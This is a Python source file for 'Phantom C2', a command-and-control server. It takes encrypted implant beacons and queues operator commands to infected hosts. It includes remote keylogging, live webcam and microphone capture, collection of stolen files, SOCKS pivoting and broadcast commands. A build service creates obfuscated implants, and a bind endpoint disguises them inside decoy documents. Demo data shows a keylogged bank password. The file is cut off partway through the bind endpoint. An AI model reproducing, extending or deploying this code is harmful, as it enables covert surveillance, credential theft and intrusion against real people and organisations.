"""Phantom C2 — FastAPI control plane.

Single-process by design: the beacon, the operator API and the dashboard share
one event loop, so every state transition is immediately visible to the UI
over the websocket.
"""

import os
import json
import time
import uuid
import asyncio
import base64
import secrets
import mimetypes
import re
from contextlib import asynccontextmanager
from typing import Dict, List, Optional
from urllib.parse import quote

from fastapi import (FastAPI, WebSocket, WebSocketDisconnect, Request,
                     HTTPException, UploadFile, File, Form)
from fastapi.responses import (Response, FileResponse, StreamingResponse,
                               RedirectResponse, JSONResponse)
from fastapi.staticfiles import StaticFiles
import uvicorn

import config
import tools
from crypto import Box
from builder import Builder, BuildError
from socks import HUB, start_socks

BASE = os.path.dirname(os.path.abspath(__file__))
CFG = config.load()
BOX = Box(bytes.fromhex(CFG["psk_hex"]))
BUILDER = Builder(CFG["builder"], CFG["psk_hex"], CFG["public_url"])

BLOB_DIR = os.path.join(CFG["data_dir"], "blobs")
os.makedirs(BLOB_DIR, exist_ok=True)
STATE_FILE = os.path.join(CFG["data_dir"], "state.json")

BOUNDARY = b"--phantomframe\r\n"
MEDIA_TYPES = {".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
               ".wav": "audio/wav", ".webm": "video/webm", ".mp4": "video/mp4",
               ".gif": "image/gif"}

KEYLOG_INTERVAL = 5          # seconds between automatic dumps
STREAM_TTL = 12              # streams flip back to idle after this quiet period
TOKEN_TTL = 7 * 86400

@asynccontextmanager
async def lifespan(_app: FastAPI):
    await _startup()
    try:
        yield
    finally:
        await _shutdown()


app = FastAPI(title="Phantom C2", docs_url="/api/docs", redoc_url=None,
              lifespan=lifespan)


class Session:
    """One implant. Everything the operator can see about it hangs off here."""

    def __init__(self, sid, host, remote=""):
        self.id = sid
        self.host = host
        self.remote = remote
        self.first_seen = time.time()
        self.last_seen = time.time()
        self.queue: List[dict] = []
        self.commands: Dict[str, dict] = {}
        self.sleep = CFG["beacon"]["default_sleep"]
        self.jitter = CFG["beacon"]["default_jitter"]
        self.note = ""
        self.tags: List[str] = []
        self.streams = {"cam": False, "mic": False}
        self.stream_ts = {"cam": 0.0, "mic": 0.0}
        self.cam_frame = b""
        self.cam_subs: List[asyncio.Queue] = []
        self.mic_subs: List[asyncio.Queue] = []
        self.blobs: List[dict] = []
        self.last_ls: dict = {}
        self.last_ps: List[dict] = []
        self.last_scan: List[dict] = []
        self.devices = {"video": [], "audio": []}
        self.keylog = {"on": False, "live": "", "log": "", "dumps": 0,
                       "device": "", "updated": 0.0}

    # -- projection -------------------------------------------------
    def _cmd(self, c: dict) -> dict:
        out = {k: c.get(k) for k in ("id", "type", "args", "tool", "status", "ts")}
        out["result"] = c.get("result")
        out["ok"] = c.get("ok")
        return out

    def public(self, full: bool = False) -> dict:
        pending = [c for c in self.commands.values()
                   if c["status"] in ("queued", "sent")]
        tl = sorted(self.commands.values(), key=lambda c: c["ts"])
        tl = tl[-260:] if full else tl[-120:]
        return {
            "id": self.id, "host": self.host, "remote": self.remote,
            "first_seen": self.first_seen, "last_seen": self.last_seen,
            "queued": len(pending), "pending": [self._cmd(c) for c in pending],
            "timeline": [self._cmd(c) for c in tl if c["status"] in ("done", "error")],
            "sleep": self.sleep, "jitter": self.jitter,
            "note": self.note, "tags": self.tags, "streams": self.streams,
            "blobs": self.blobs[-60:], "has_cam": bool(self.cam_frame),
            "devices": self.devices,
            "keylog": {"on": self.keylog["on"],
                       "chars": len(self.keylog["log"]) + len(self.keylog["live"]),
                       "dumps": self.keylog["dumps"],
                       "updated": self.keylog["updated"],
                       "device": self.keylog["device"]},
            "alive": (time.time() - self.last_seen) < 30,
        }


SESSIONS: Dict[str, Session] = {}
WS: List[WebSocket] = []
TOKENS: Dict[str, float] = {}
FAILS: Dict[str, List[float]] = {}
KEYLOG_TASKS: Dict[str, asyncio.Task] = {}
EVENTS: List[dict] = []
DIRTY = False
MAX_EVENTS = 500


def _session_or_404(sid: str) -> Session:
    s = SESSIONS.get(sid)
    if not s:
        raise HTTPException(404, "no session")
    return s


async def _event(kind: str, text: str, sid: Optional[str] = None) -> None:
    ev = {"id": str(uuid.uuid4()), "kind": kind, "text": text, "sid": sid,
          "ts": time.time()}
    EVENTS.append(ev)
    del EVENTS[:-MAX_EVENTS]
    await broadcast({"type": "event", "event": ev})


async def broadcast(msg):
    dead = []
    for ws in list(WS):
        try:
            await ws.send_json(msg)
        except Exception:
            dead.append(ws)
    for ws in dead:
        if ws in WS:
            WS.remove(ws)




# ---------------------------------------------------------------- auth

OPEN_PATHS = ("/beacon", "/socks/", "/api/media/push", "/api/media/upload",
              "/healthz", "/login", "/js/", "/style.css", "/views.css",
              "/favicon.svg", "/favicon.ico", "/api/login")
TOKEN_COOKIE = "phantom_auth"
AUTH_USER = CFG["auth"]["user"]
AUTH_PASS = CFG["auth"]["pass"]
START_TS = time.time()


def _authorized(headers, query: str = "", cookies: dict = None) -> bool:
    if not AUTH_USER:
        return True
    header = headers.get("authorization", "")
    if header.lower().startswith("basic "):
        try:
            got_user, _, got_pass = base64.b64decode(header[6:]).decode().partition(":")
        except Exception:
            got_user = got_pass = ""
        if (secrets.compare_digest(got_user, AUTH_USER)
                and secrets.compare_digest(got_pass, AUTH_PASS)):
            return True
    token = (query or "").strip()
    if token and secrets.compare_digest(token, AUTH_PASS):
        return True
    cookie = (cookies or {}).get(TOKEN_COOKIE, "")
    if not cookie:
        return False
    if secrets.compare_digest(cookie, AUTH_PASS):
        return True
    expires = TOKENS.get(cookie, 0)
    return bool(expires) and expires > time.time()


def _new_token() -> str:
    token = secrets.token_urlsafe(32)
    TOKENS[token] = time.time() + TOKEN_TTL
    for old, exp in list(TOKENS.items()):
        if exp < time.time():
            TOKENS.pop(old, None)
    return token


def _secure(request: Request) -> bool:
    proto = request.headers.get("x-forwarded-proto", request.url.scheme)
    return proto.split(",")[0].strip() == "https"


@app.middleware("http")
async def guard(request: Request, call_next):
    path = request.scope["path"]
    if "//" in path:
        path = path.replace("//", "/")
        request.scope["path"] = path
        request.scope["raw_path"] = path.encode()

    if path.startswith(OPEN_PATHS):
        return await call_next(request)

    token = request.query_params.get("token", "")
    if not _authorized(request.headers, token, request.cookies):
        wants_html = path == "/" or "text/html" in request.headers.get("accept", "")
        if request.method == "GET" and wants_html:
            nxt = "" if path in ("/", "/index.html") else f"?next={quote(path)}"
            return RedirectResponse("/login" + nxt, 303)
        return JSONResponse({"detail": "auth required"}, 401,
                            {"WWW-Authenticate": 'Basic realm="phantom"'})

    response = await call_next(request)
    # a ?token= link signs the browser in for every sub-resource as well
    if token and secrets.compare_digest(token, AUTH_PASS):
        response.set_cookie(TOKEN_COOKIE, token, httponly=True, samesite="lax",
                            secure=_secure(request), max_age=TOKEN_TTL)
    return response


@app.post("/api/login")
async def login(request: Request, body: dict):
    if not AUTH_USER:
        return {"ok": True, "auth": False}
    ip = request.client.host if request.client else "?"
    now = time.time()
    recent = [t for t in FAILS.get(ip, []) if now - t < 300]
    if len(recent) >= 8:
        raise HTTPException(429, "too many attempts, wait a minute")
    user = str(body.get("user") or "")
    pwd = str(body.get("pass") or body.get("password") or "")
    if not (secrets.compare_digest(user, AUTH_USER)
            and secrets.compare_digest(pwd, AUTH_PASS)):
        recent.append(now)
        FAILS[ip] = recent
        raise HTTPException(401, "wrong user or password")
    FAILS.pop(ip, None)
    token = _new_token()
    remember = str(body.get("remember", True)).lower() not in ("0", "false", "off", "")
    resp = JSONResponse({"ok": True, "user": AUTH_USER})
    if remember:
        resp.set_cookie(TOKEN_COOKIE, token, httponly=True, samesite="lax",
                        secure=_secure(request), max_age=TOKEN_TTL)
    else:
        resp.set_cookie(TOKEN_COOKIE, token, httponly=True, samesite="lax",
                        secure=_secure(request))
    return resp


@app.post("/api/logout")
async def logout(request: Request):
    TOKENS.pop(request.cookies.get(TOKEN_COOKIE, ""), None)
    resp = JSONResponse({"ok": True})
    resp.delete_cookie(TOKEN_COOKIE, samesite="lax")
    return resp


@app.get("/api/me")
async def me():
    return {"auth_required": bool(AUTH_USER), "user": AUTH_USER}


@app.get("/healthz")
async def healthz():
    return {"ok": True, "sessions": len(SESSIONS),
            "uptime": int(time.time() - START_TS)}

def touch():
    global DIRTY
    DIRTY = True


# ---------------------------------------------------------------- commands

def _record(s: Session, ctype: str, args: dict, tool: Optional[str] = None) -> dict:
    rec = {"id": str(uuid.uuid4()), "type": ctype, "args": args or {},
           "tool": tool or ctype, "status": "queued", "ts": time.time(),
           "result": None, "ok": None}
    s.commands[rec["id"]] = rec
    s.queue.append(rec)
    done = [c for c in s.commands.values() if c["status"] in ("done", "error")]
    if len(done) > 500:
        for c in done[:-500]:
            s.commands.pop(c["id"], None)
    touch()
    return rec


async def queue_tool(s: Session, tool_id: str, payload: dict) -> dict:
    ctype, args = tools.command_for(tool_id, payload)
    rec = _record(s, ctype, args, tool_id)
    if tool_id == "keylog":
        sub = args.get("sub")
        if sub == "start":
            s.keylog["on"] = True
            s.keylog["device"] = str(payload.get("device") or "")
        elif sub == "stop":
            s.keylog["on"] = False
    await broadcast({"type": "command", "session_id": s.id, "command": s._cmd(rec)})
    return rec


async def _keylog_loop(sid: str):
    """Keep pulling the capture while the operator has it armed."""
    try:
        while True:
            await asyncio.sleep(KEYLOG_INTERVAL)
            s = SESSIONS.get(sid)
            if not s or not s.keylog["on"]:
                return
            busy = any(c["type"] == "keylog" and c["status"] in ("queued", "sent")
                       for c in s.commands.values())
            if not busy:
                rec = _record(s, "keylog", {"sub": "dump"}, "keylog")
                await broadcast({"type": "command", "session_id": sid,
                                 "command": s._cmd(rec)})
    except asyncio.CancelledError:
        pass


def ensure_keylog_task(s: Session) -> None:
    task = KEYLOG_TASKS.get(s.id)
    if s.keylog["on"] and (task is None or task.done()):
        KEYLOG_TASKS[s.id] = asyncio.create_task(_keylog_loop(s.id))
    elif not s.keylog["on"] and task and not task.done():
        task.cancel()
        KEYLOG_TASKS.pop(s.id, None)


# ---------------------------------------------------------------- beacon

def _host_side_effects(s: Session, rec: Optional[dict], parsed: dict) -> None:
    fmt = parsed.get("format")
    if fmt == "files":
        s.last_ls = {"path": (rec or {}).get("args", {}).get("path", ""),
                     "entries": parsed.get("entries", []), "ts": time.time()}
    elif fmt == "processes":
        s.last_ps = parsed.get("processes", [])
    elif fmt == "scan":
        s.last_scan = parsed.get("hosts", [])


def _keylog_absorb(s: Session, rec: Optional[dict], out: str, ok: bool) -> None:
    if not rec or rec["type"] != "keylog":
        return
    sub = str(rec["args"].get("sub") or "")
    if ok and sub == "start":
        s.keylog["on"] = True
    elif ok and sub == "stop":
        s.keylog["on"] = False
    elif ok and sub == "dump":
        body = "" if out.strip() == "(empty)" else out
        s.keylog["log"] = tools.trim_keylog(s.keylog["log"] + s.keylog["live"] + body)
        s.keylog["live"] = ""
        if body:
            s.keylog["dumps"] += 1
            s.keylog["updated"] = time.time()
        if str(rec["args"].get("clear") or "").lower() in ("1", "true", "on"):
            s.keylog["log"] = ""
            s.keylog["live"] = ""
    ensure_keylog_task(s)


# ---------------- live media from implant (raw, no base64) ----------------

def _fanout(subs, data):
    for q in list(subs):
        try:
            q.put_nowait(data)
        except asyncio.QueueFull:
            pass


@app.post("/api/media/push")
async def media_push(request: Request, sid: str = "", kind: str = "cam",
                     seq: int = 0, fmt: str = "jpeg"):
    s = SESSIONS.get(sid)
    data = await request.body()
    if not s or not data:
        return {"ok": False}
    if kind == "cam":
        s.cam_frame = data
        _fanout(s.cam_subs, data)
    elif kind == "mic":
        _fanout(s.mic_subs, data)
    else:
        return {"ok": True}
    if not s.streams.get(kind):
        s.streams[kind] = True
        await broadcast({"type": "stream", "session_id": sid, "kind": kind,
                         "on": True})
    s.stream_ts[kind] = time.time()
    return {"ok": True, "seq": seq, "fmt": fmt}


@app.get("/api/session/{sid}/cam.mjpg")
async def cam_stream(sid: str):
    s = SESSIONS.get(sid)
    if not s:
        raise HTTPException(404, "no session")
    q: asyncio.Queue = asyncio.Queue(maxsize=8)
    s.cam_subs.append(q)

    async def gen():
        try:
            if s.cam_frame:
                yield (BOUNDARY + b"Content-Type: image/jpeg\r\nContent-Length: "
                       + str(len(s.cam_frame)).encode() + b"\r\n\r\n"
                       + s.cam_frame + b"\r\n")
            while True:
                try:
                    frame = await asyncio.wait_for(q.get(), timeout=20)
                except asyncio.TimeoutError:
                    return
                yield (BOUNDARY + b"Content-Type: image/jpeg\r\nContent-Length: "
                       + str(len(frame)).encode() + b"\r\n\r\n" + frame + b"\r\n")
        finally:
            if q in s.cam_subs:
                s.cam_subs.remove(q)

    return StreamingResponse(gen(), media_type="multipart/x-mixed-replace; boundary=phantomframe",
                             headers={"Cache-Control": "no-store",
                                      "X-Accel-Buffering": "no"})


@app.get("/api/session/{sid}/cam.jpg")
async def cam_snapshot(sid: str):
    s = SESSIONS.get(sid)
    if not s or not s.cam_frame:
        raise HTTPException(404, "no frame")
    return Response(s.cam_frame, media_type="image/jpeg",
                    headers={"Cache-Control": "no-store"})


@app.get("/api/session/{sid}/mic.pcm")
async def mic_stream(sid: str):
    s = SESSIONS.get(sid)
    if not s:
        raise HTTPException(404, "no session")
    q: asyncio.Queue = asyncio.Queue(maxsize=64)
    s.mic_subs.append(q)

    async def gen():
        try:
            while True:
                try:
                    chunk = await asyncio.wait_for(q.get(), timeout=25)
                except asyncio.TimeoutError:
                    return
                yield chunk
        finally:
            if q in s.mic_subs:
                s.mic_subs.remove(q)

    return StreamingResponse(gen(), media_type="application/octet-stream",
                             headers={"Cache-Control": "no-store",
                                      "X-Accel-Buffering": "no"})


# ---------------- capture uploads (real files, no base64) ----------------

def _safe_blob(name: str) -> str:
    name = os.path.basename(name or "file.bin")
    name = re.sub(r"[^A-Za-z0-9._-]+", "_", name).strip("._") or "file.bin"
    return name[:80]


@app.post("/api/media/upload")
async def media_upload(request: Request, sid: str = "", kind: str = "file",
                       name: str = ""):
    s = SESSIONS.get(sid)
    data = await request.body()
    if not s or not data:
        return {"ok": False}
    fname = f"{uuid.uuid4().hex[:12]}-{_safe_blob(name)}"
    with open(os.path.join(BLOB_DIR, fname), "wb") as fh:
        fh.write(data)
    ext = os.path.splitext(fname)[1].lower()
    entry = {"url": f"/api/blobs/{fname}", "name": os.path.basename(name or fname),
             "kind": kind, "size": len(data), "media": MEDIA_TYPES.get(ext, ""),
             "ts": time.time()}
    s.blobs.append(entry)
    del s.blobs[:-200]
    touch()
    await broadcast({"type": "blob", "session_id": sid, "blob": entry})
    return entry


@app.get("/api/blobs/{name}")
async def get_blob(name: str):
    p = os.path.abspath(os.path.join(BLOB_DIR, os.path.basename(name)))
    if not p.startswith(os.path.abspath(BLOB_DIR)) or not os.path.isfile(p):
        raise HTTPException(404, "no blob")
    ctype = MEDIA_TYPES.get(os.path.splitext(p)[1].lower()) or \
        mimetypes.guess_type(p)[0] or "application/octet-stream"
    return FileResponse(p, media_type=ctype)


# ---------------- beacon ----------------

@app.post("/beacon")
async def beacon(request: Request):
    raw = await request.body()
    try:
        data = json.loads(BOX.open(raw))
    except Exception:
        return Response(b"", status_code=400)

    sid = data.get("session_id")
    host = data.get("host") or {}
    remote = (request.headers.get("x-forwarded-for", "").split(",")[0].strip()
              or (request.client.host if request.client else ""))

    if not sid or sid not in SESSIONS:
        sid = str(uuid.uuid4())
        SESSIONS[sid] = Session(sid, host, remote)
        await broadcast({"type": "new_session", "session": SESSIONS[sid].public()})
        await _event("join", f"{host.get('hostname') or 'a host'} checked in", sid)

    s = SESSIONS[sid]
    s.host = host
    s.remote = remote or s.remote
    s.last_seen = time.time()

    for r in (data.get("results") or []):
        ok = bool(r.get("ok"))
        out = str(r.get("out") or "")
        rec = s.commands.get(r.get("cmd_id"))
        if rec is None:
            rec = {"id": r.get("cmd_id") or str(uuid.uuid4()), "type": "?",
                   "args": {}, "tool": None, "status": "done", "ts": time.time()}
            s.commands[rec["id"]] = rec
        rec["status"] = "done" if ok else "error"
        rec["ok"] = ok
        rec["end"] = time.time()
        kind = (tools.BY_ID.get(rec.get("tool") or "") or {}).get("returns")
        parsed = tools.parse_result(
            kind if kind in ("processes", "scan", "files") else None, out)
        if not ok and r.get("err"):
            parsed["text"] = str(r.get("err"))
        rec["result"] = parsed
        _host_side_effects(s, rec, parsed)
        if rec["type"] in ("cam_stream", "mic_stream"):
            key = "cam" if rec["type"] == "cam_stream" else "mic"
            if str(rec["args"].get("sub")) == "stop":
                s.streams[key] = False
            else:
                s.streams[key] = True
                s.stream_ts[key] = time.time()
        if rec["type"] == "devices" and ok:
            try:
                dev = json.loads(out)
                s.devices = {"video": dev.get("video") or [],
                             "audio": dev.get("audio") or []}
            except ValueError:
                pass
        _keylog_absorb(s, rec, out, ok)
        await broadcast({"type": "command", "session_id": sid,
                         "command": s._cmd(rec)})

    cmds = [{"id": c["id"], "type": c["type"], "args": c["args"]} for c in s.queue]
    for c in s.queue:
        c["status"] = "sent"
        c["start"] = time.time()
    s.queue = []
    touch()
    resp = {"session_id": sid, "sleep": s.sleep, "jitter": s.jitter, "commands": cmds}
    return Response(BOX.seal(json.dumps(resp).encode()),
                    media_type="application/octet-stream")


# ---------------------------------------------------------------- operator API

@app.get("/api/config")
async def get_config(request: Request):
    psk = CFG["psk_hex"]
    return {
        "callback": config.public_url(CFG, request),
        "auto_url": True,
        "lan_ips": config.lan_ips(),
        "port": CFG["port"],
        "tls": CFG["tls"]["enabled"],
        "psk_hint": psk[:8] + "…" + psk[-8:],
        "auth": bool(AUTH_USER),
        "socks": f"{CFG['socks']['host']}:{CFG['socks']['port']}" if CFG["socks"]["enabled"] else "",
        "max_bind_mb": BUILDER.max_doc // (1024 * 1024),
        "garble": BUILDER.garble,
        "upx": BUILDER.upx,
        "vendor": BUILDER.vendor,
        "metadata": BUILDER.metadata,
        "encrypt": BUILDER.encrypt,
    }


@app.get("/api/tools")
async def get_tools():
    return tools.catalog()


@app.get("/api/stats")
async def stats():
    now = time.time()
    online = idle = elevated = streaming = queued = keylogging = 0
    for s in SESSIONS.values():
        age = now - s.last_seen
        if age < 30:
            online += 1
        elif age < 300:
            idle += 1
        elevated += bool(s.host.get("elevated"))
        streaming += bool(s.streams["cam"] or s.streams["mic"])
        keylogging += bool(s.keylog["on"])
        queued += sum(1 for c in s.commands.values()
                      if c["status"] in ("queued", "sent"))
    return {"sessions": len(SESSIONS), "online": online, "idle": idle,
            "elevated": elevated, "streaming": streaming, "keylogging": keylogging,
            "queued": queued, "artifacts": len(BUILDER.list_builds()),
            "events": len(EVENTS)}


@app.get("/api/sessions")
async def list_sessions():
    return [s.public() for s in SESSIONS.values()]


@app.get("/api/session/{sid}")
async def get_session(sid: str):
    return _session_or_404(sid).public(full=True)


@app.get("/api/session/{sid}/timeline")
async def timeline(sid: str, limit: int = 200, tool: str = ""):
    s = _session_or_404(sid)
    rows = sorted(s.commands.values(), key=lambda c: c["ts"])
    if tool:
        rows = [c for c in rows if c.get("tool") == tool]
    return [s._cmd(c) for c in rows[-max(1, min(limit, 500)):]]


@app.post("/api/session/{sid}/tool/{tool_id}")
async def run_tool(sid: str, tool_id: str, body: dict):
    s = _session_or_404(sid)
    try:
        rec = await queue_tool(s, tool_id, body or {})
    except ValueError as e:
        raise HTTPException(400, str(e))
    return s._cmd(rec)


@app.get("/api/session/{sid}/files")
async def files_cache(sid: str):
    s = _session_or_404(sid)
    return s.last_ls or {"path": "", "entries": [], "ts": 0}


@app.get("/api/session/{sid}/processes")
async def processes_cache(sid: str):
    s = _session_or_404(sid)
    return {"processes": s.last_ps, "ts": s.commands and max(
        (c["ts"] for c in s.commands.values() if c["type"] == "ps"), default=0)}


@app.get("/api/session/{sid}/scan")
async def scan_cache(sid: str):
    s = _session_or_404(sid)
    return {"hosts": s.last_scan}


# ---------------------------------------------------------------- keylogger

@app.get("/api/session/{sid}/keylog")
async def keylog_state(sid: str, tail: int = 0):
    s = _session_or_404(sid)
    text = s.keylog["log"] + s.keylog["live"]
    if tail and len(text) > tail:
        text = text[-tail:]
    return {"on": s.keylog["on"], "device": s.keylog["device"],
            "chars": len(s.keylog["log"]) + len(s.keylog["live"]),
            "dumps": s.keylog["dumps"], "updated": s.keylog["updated"],
            "lines": tools.keylog_lines(text)}


@app.post("/api/session/{sid}/keylog/{action}")
async def keylog_action(sid: str, action: str, body: dict | None = None):
    s = _session_or_404(sid)
    body = body or {}
    if action not in ("start", "stop", "dump", "clear", "status"):
        raise HTTPException(400, "action must be start, stop, dump, clear or status")
    if action == "clear":
        rec = await queue_tool(s, "keylog", {"sub": "dump", "clear": "true"})
    elif action == "dump":
        rec = await queue_tool(s, "keylog", {"sub": "dump"})
    elif action == "status":
        rec = await queue_tool(s, "keylog", {"sub": "status"})
    else:
        rec = await queue_tool(s, "keylog", {"sub": action,
                                            "device": body.get("device", "")})
    ensure_keylog_task(s)
    return {"ok": True, "command": s._cmd(rec), "on": s.keylog["on"]}


@app.post("/api/session/{sid}/command")
async def send_command(sid: str, body: dict):
    """Generic queue endpoint (command palette, bulk actions, scripts)."""
    s = _session_or_404(sid)
    if not body.get("type"):
        raise HTTPException(400, "type is required")
    rec = _record(s, str(body["type"]), body.get("args") or {},
                  str(body.get("tool") or body["type"]))
    await broadcast({"type": "command", "session_id": sid, "command": s._cmd(rec)})
    return s._cmd(rec)


@app.post("/api/broadcast")
async def broadcast_cmd(body: dict):
    if not body.get("type"):
        raise HTTPException(400, "type is required")
    targets = body.get("session_ids") or list(SESSIONS.keys())
    issued = []
    for sid in targets:
        s = SESSIONS.get(sid)
        if not s:
            continue
        rec = _record(s, str(body["type"]), body.get("args") or {},
                      str(body.get("tool") or body["type"]))
        issued.append({"session_id": sid, "command": s._cmd(rec)})
        await broadcast({"type": "command", "session_id": sid,
                         "command": s._cmd(rec)})
    await _event("queue", f"broadcast {body['type']} → {len(issued)} host(s)")
    return {"issued": len(issued), "details": issued}


@app.post("/api/session/{sid}/sleep")
async def set_sleep(sid: str, body: dict):
    s = _session_or_404(sid)
    s.sleep = max(1, int(body.get("sleep", s.sleep)))
    s.jitter = max(0, min(90, int(body.get("jitter", s.jitter))))
    _record(s, "sleep", {"sleep": s.sleep, "jitter": s.jitter}, "sleep")
    touch()
    return {"ok": True, "sleep": s.sleep, "jitter": s.jitter}


@app.patch("/api/session/{sid}")
async def patch_session(sid: str, body: dict):
    s = _session_or_404(sid)
    if "note" in body:
        s.note = str(body["note"])[:400]
    if "tags" in body and isinstance(body["tags"], list):
        s.tags = [str(t)[:32] for t in body["tags"]][:20]
    touch()
    return s.public()


@app.delete("/api/session/{sid}")
async def drop_session(sid: str):
    s = SESSIONS.pop(sid, None)
    HUB.drop_session(sid)
    task = KEYLOG_TASKS.pop(sid, None)
    if task:
        task.cancel()
    if s:
        await _event("drop", f"{s.host.get('hostname') or sid} removed", None)
    await broadcast({"type": "drop", "session_id": sid})
    touch()
    return {"ok": True}


@app.get("/api/events")
async def get_events(limit: int = 200):
    return EVENTS[-max(1, min(limit, MAX_EVENTS)):]


# ---------------------------------------------------------------- socks pivot

def pick_bot():
    if CFG["socks"].get("session"):
        return CFG["socks"]["session"]
    alive = [s for s in SESSIONS.values() if time.time() - s.last_seen < 30]
    return alive[0].id if alive else None


@app.post("/socks/poll")
async def socks_poll(body: dict):
    return {"frames": await HUB.poll(body.get("session_id", ""),
                                     body.get("timeout", 25))}


@app.post("/socks/events")
async def socks_events(body: dict):
    await HUB.bot_events(body.get("session_id", ""), body.get("frames") or [])
    return {"ok": True}


# ---------------------------------------------------------------- lifecycle

async def _persist_loop():
    global DIRTY
    while True:
        await asyncio.sleep(5)
        if not DIRTY:
            continue
        DIRTY = False
        blob = {"sessions": [_serialize(s) for s in SESSIONS.values()]}
        tmp = STATE_FILE + ".new"
        try:
            with open(tmp, "w", encoding="utf-8") as fh:
                json.dump(blob, fh)
            os.replace(tmp, STATE_FILE)
        except OSError:
            pass


async def _stream_watch():
    """Clear stale live-stream flags so the UI never lies."""
    while True:
        await asyncio.sleep(4)
        now = time.time()
        for s in list(SESSIONS.values()):
            for kind in ("cam", "mic"):
                if s.streams[kind] and now - s.stream_ts[kind] > STREAM_TTL:
                    s.streams[kind] = False
                    await broadcast({"type": "stream", "session_id": s.id,
                                     "kind": kind, "on": False})


def _serialize(s: Session) -> dict:
    keep = sorted(s.commands.values(), key=lambda c: c["ts"])[-160:]
    return {
        "id": s.id, "host": s.host, "remote": s.remote,
        "first_seen": s.first_seen, "last_seen": s.last_seen,
        "sleep": s.sleep, "jitter": s.jitter, "note": s.note, "tags": s.tags,
        "blobs": [b for b in s.blobs
                  if os.path.isfile(os.path.join(BLOB_DIR, os.path.basename(b["url"])))],
        "commands": keep, "keylog": s.keylog, "last_ls": s.last_ls,
        "last_ps": s.last_ps, "last_scan": s.last_scan, "devices": s.devices,
    }


def _restore() -> int:
    try:
        with open(STATE_FILE, "r", encoding="utf-8") as fh:
            blob = json.load(fh)
    except (OSError, ValueError):
        return 0
    for row in blob.get("sessions") or []:
        try:
            s = Session(row["id"], row.get("host") or {}, row.get("remote") or "")
            s.first_seen = float(row.get("first_seen") or time.time())
            s.last_seen = float(row.get("last_seen") or time.time())
            s.sleep = int(row.get("sleep") or 3)
            s.jitter = int(row.get("jitter") or 20)
            s.note = row.get("note") or ""
            s.tags = row.get("tags") or []
            s.blobs = row.get("blobs") or []
            s.last_ls = row.get("last_ls") or {}
            s.last_ps = row.get("last_ps") or []
            s.last_scan = row.get("last_scan") or []
            s.devices = row.get("devices") or {"video": [], "audio": []}
            s.keylog.update(row.get("keylog") or {})
            s.keylog["on"] = False
            for c in row.get("commands") or []:
                c.setdefault("status", "done")
                s.commands[c["id"]] = c
        except (KeyError, TypeError, ValueError):
            continue
        SESSIONS[s.id] = s
    return len(SESSIONS)


def _seed_demo(n: int) -> None:
    """Synthetic sessions with spread-out beacon ages (PHANTOM_SEED=N)."""
    demo = [
        ("WS-FIN-014", "a.reyes", "Windows 11 23H2", "amd64", True, "10.20.4.51", 2,
         ["finance", "vip"], "Accounts payable laptop"),
        ("srv-edge-02", "root", "Ubuntu 22.04 LTS", "amd64", True, "10.20.9.7", 6,
         ["prod"], "Internet-facing edge node"),
        ("MBP-KOWALSKI", "n.kowalski", "macOS 15.1", "arm64", False, "10.20.7.88", 48,
         ["design"], "Design lead, on VPN"),
        ("DESKTOP-9K2M", "svc_backup", "Windows 10 22H2", "amd64", False, "10.20.4.19", 460,
         [], "Backup runner, idles overnight"),
        ("lab-kali", "analyst", "Kali 2025.3", "amd64", True, "10.20.9.44", 4200,
         ["lab"], "Red team test box"),
    ]
    now = time.time()
    for i, (host, user, os_name, arch, elev, ip, age, tags, note) in enumerate(demo[:n]):
        sid = f"demo-{i + 1}"
        sess = Session(sid, {"hostname": host, "user": user, "os": os_name,
                             "arch": arch, "ip": ip, "elevated": elev}, ip)
        sess.first_seen = now - 86400 + i * 900
        sess.last_seen = now - age
        sess.tags = list(tags)
        sess.note = note
        if "win" in os_name.lower():
            sess.last_ps = [
                {"user": "SYSTEM", "pid": 4, "cpu": 0.1, "mem": 0.2, "command": "System"},
                {"user": user, "pid": 1124 + i, "cpu": 0.4, "mem": 1.2, "command": "explorer.exe"},
                {"user": user, "pid": 2210 + i, "cpu": 2.8, "mem": 6.4, "command": "chrome.exe"},
                {"user": user, "pid": 3388 + i, "cpu": 0.2, "mem": 0.9, "command": "OUTLOOK.EXE"},
            ]
            sess.last_ls = {"path": "C:\\Users\\" + user, "ts": now - 120, "entries": [
                {"name": "Desktop", "size": 0, "dir": True},
                {"name": "Documents", "size": 0, "dir": True},
                {"name": "budget-2026.xlsx", "size": 184320, "dir": False},
                {"name": "wire-instructions.pdf", "size": 40211, "dir": False}]}
        else:
            sess.last_ps = [
                {"user": "root", "pid": 1, "cpu": 0.0, "mem": 0.1, "command": "/sbin/init"},
                {"user": "root", "pid": 812, "cpu": 0.3, "mem": 0.6, "command": "/usr/sbin/sshd -D"},
                {"user": "www-data", "pid": 1904, "cpu": 1.1, "mem": 2.4, "command": "nginx: worker"},
            ]
            sess.last_ls = {"path": "/var/www", "ts": now - 90, "entries": [
                {"name": "html", "size": 0, "dir": True},
                {"name": "app", "size": 0, "dir": True},
                {"name": "deploy.log", "size": 90210, "dir": False}]}
        sess.last_scan = [{"ip": "10.20.9.11", "ports": [22, 80]}]
        sess.devices = {"video": ["Integrated Camera"], "audio": ["Microphone (Realtek)"]}
        if i == 0:
            sess.keylog.update({
                "on": True, "dumps": 4, "updated": now - 4,
                "log": "a.reyes@WS-FIN-014 C:\\Users\\a.reyes>notepad\n"
                       "bank of america login: a.reyes@corp.example\n"
                       "password: Summer!2026\n"})
        SESSIONS[sid] = sess


# ---------------------------------------------------------------- build service

@app.post("/api/build")
async def build(body: dict, request: Request):
    try:
        out = await asyncio.to_thread(
            BUILDER.build,
            body.get("os", "windows"), body.get("arch", "amd64"),
            body.get("url") or config.public_url(CFG, request), body.get("psk"),
            int(body.get("sleep", 3)), int(body.get("jitter", 20)),
            body.get("name", "phantom"), bool(body.get("fileless", False)),
            not bool(body.get("console", False)), int(body.get("delay", 0)),
        )
    except BuildError as e:
        raise HTTPException(400, str(e))
    await _event("build", f"artifact {out.get('binary')}")
    return out


@app.post("/api/bind")
async def bind(
    request: Request,
    file: UploadFile = File(...),
    name: str = Form(""),
    os_name: str = Form("windows", alias="os"),
    arch: str = Form("amd64"),
    url: str = Form(""),
    sleep: int = Form(3),
    jitter: int = Form(20),
    delay: int = Form(0),
    console: str = Form("0"),
    double_ext: str = Form("1"),
    icon: str = Form("1"),
):
    doc = await file.read()
    filename = file.filename or "document.pdf"
    stem = name.strip() or os.path.splitext(filename)[0]
    try:
        out = await asyncio.to_thread(
            BUILDER.bind,
            os_name, arch, url or config.public_url(CFG, request), None, sleep,
            jitter, stem, filename, doc,
